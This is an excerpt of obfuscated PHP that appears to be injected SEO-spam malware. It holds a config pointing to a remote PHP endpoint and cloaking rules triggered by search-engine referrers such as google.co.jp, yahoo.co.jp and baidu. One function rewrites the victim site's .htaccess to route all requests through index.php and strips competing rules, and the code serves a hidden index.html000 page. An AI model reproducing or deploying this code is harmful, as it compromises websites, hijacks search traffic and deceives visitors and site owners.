...
x6=
x7=http://zenjp54.llwjrtyj583nskt/weilai0.php
cache=0000
sps=111111010
urlgz=^/[0:10~12][2:4][0:4]!/|[0:1][2:10~12]/[2:5]/[2:8][0:5]/!|[0:8~10]/^/!/[0:10~15]/|[0:10~12]^/[0:10~12]_[1:5]-!/|[0:12~15]^/[0:6]_[2:8]-!/|[0:12~15]/^[0:1]_[1:4][0:1]!/|[0:6~8]^/[0:6~8]/[1:5~10]_!|[0:10~12]-[0:10~12]/^-!|[0:5]^-!-[0:1]-[0:1]/[0:8~10]|^[0:8~12]_[1:8]/[0:8~10]!|^[0:3]_[0:15~18]_[1:10~12]-!|^[0:3~5]!_[0:15~18].fit|[0:10]-[0:10]_^[0:1][1:5][0:1]!.help|[0:6~8]^-[1:10]_[0:10~12]_!.art|[0:8]^[0:4~8]-[2:8~10]_!.host|[0:4~8]/^_[2:6]/[0:8~10]_!.edu|[0:8]_^_!_[0:12~18].pass|^/[1:10~12]/[0:10]/!.shtm|[0:6]_[0:8]^[0:3]/[0:6]!.online|^/[0:10~15]/!_[0:10~15].php|^_[2:10~12]/![0:15~18][0:1].php|[0:1]^[0:10~15]-[1:3]-[1:3]-[1:3]/[0:8]!.php|^[0:1]_[0:5~10]_[0:10~15]_!.jp|^-[0:8~12]/[0:8~12]!.jp|[0:8~12]-[0:8~12]/^[0:8~12]/!.jp|^/[1:5~8]/![0:6]/[0:10~12].html|[0:8~10]/^/!/[0:10~18].html|[0:10~15]/item/m^[0:1]!.html|item/[0:2~5]^[0:2~5]!.html|[0:10~15]/^[0:1~5]!.html
';
@set_time_limit(7200);
@ignore_user_abort(1);
@ob_start();
...
{
    $refer_match = preg_match('/(google.co.jp|yahoo.co.jp|bing|baidu)/si', $refer);
    if ($refer_match) {
...
function xhtacc($htaccess_path = '')
{
    $htaccess_path = '.htaccess';
    // check filemtime
    if (!filetime_check($htaccess_path)) {
        ...
        if ($fc !== false) {
            ...
            if (isset($matches[0]) && !empty($matches[0])) {
                // check if %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) etc...
                foreach ($matches[0] as $block) {
                    if (!preg_match("/(\{HT" . 'TP_USER_AGENT\}|webdirect.php|\/index.php|php\?hl' . "=\\\$1|\^\(.\*\)\\\$|.\*-.\*|\?\\\$\d\d?\\\$1\d)/si", $block)) {
                        $nfc[] = $block;
                    }
                }
            }
        ...
        if (empty($nfc)) {
            # use default
            $nfc[] = sprintf('<IfModule%smod_rewrite.c>%sRewriteEngine%sOn%sRewriteCond%s%s{REQUEST_FILENAME}%s!-f%sRewriteCond%s%s{REQUEST_FILENAME}%s!-d%sRewriteRule%s.%sindex.php%s[L]%s</IfModule>', ' ', "\n", ' ', "\n", ' ', '%', ' ', "\n", ' ', '%', ' ', "\n", ' ', ' ', ' ', "\n");
        }
        fput_contents($htaccess_path, trim(implode("\n", $nfc)));
        $fc = $nfc = null;
        // @chmod($htaccess, 0444);
        // @file_put_contents($htaccess_path, "<IfModule mod_" . "rewrite.c>\nRewriteCond %{RE" . "QUEST_FILENAME} !-f\nRewrit" . "eCond %{REQUEST_F" . "ILENAME} !-d\nRewriteRule . index" . ".php [L]\n</IfMod" . "ule>");
        // @file_put_contents($htaccess_path, sprintf("<IfModule%smod_" . "rewrite.c>%sRewriteEngine%sOn%sRewriteCond%s%s{RE" . "QUEST_FILENAME}%s!-f%sRewrit" . "eCond%s%s{REQUEST_F" . "ILENAME}%s!-d%sRewriteRule%s.%sindex" . ".php%s[L]%s</IfMod" . "ule>", ' ', "\n", ' ', "\n", ' ', '%', ' ', "\n", ' ', '%', ' ', "\n", ' ', ' ', ' ', "\n"));
        filetime_change($htaccess_path);
...
if (file_exists("index.html000")){echo file_get_contents("index.html000");exit;}